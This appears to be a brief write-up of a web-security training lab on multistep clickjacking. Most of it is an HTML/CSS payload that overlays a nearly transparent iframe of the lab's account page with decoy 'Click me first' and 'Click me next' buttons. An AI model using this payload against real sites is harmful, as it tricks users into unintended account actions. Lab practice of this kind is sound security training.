# [ClickJacking] Lab: Multistep clickjacking (1)

---

![Untitled](%5BClickJacking%5D%20Lab%20Multistep%20clickjacking%20(1)%20d80c8e98dc4d459aa16e70b924d1eaaa/Untitled.png)

since the lab allows the two elements to be shown at once we can easily build apaylaod as such: 

```jsx
<style>
	iframe {
		position:relative;
		width: 400px;;
		height:530;
		opacity: 0.10001;
		z-index: 2;
	}
   .firstlick, .secondlick {
		position:absolute;
		top: 500;
		left:150;
		z-index: 1;
	}
   .secondlick {
		top:320;
		left:150;
	}
</style>
<div class="firstlick">Click me first</div>
<div class="secondlick">Click me next</div>
<iframe src="https://0a4900e1045b674585f544d8006900ff.web-security-academy.net/my-account"></iframe>
```

![Untitled](%5BClickJacking%5D%20Lab%20Multistep%20clickjacking%20(1)%20d80c8e98dc4d459aa16e70b924d1eaaa/Untitled%201.png)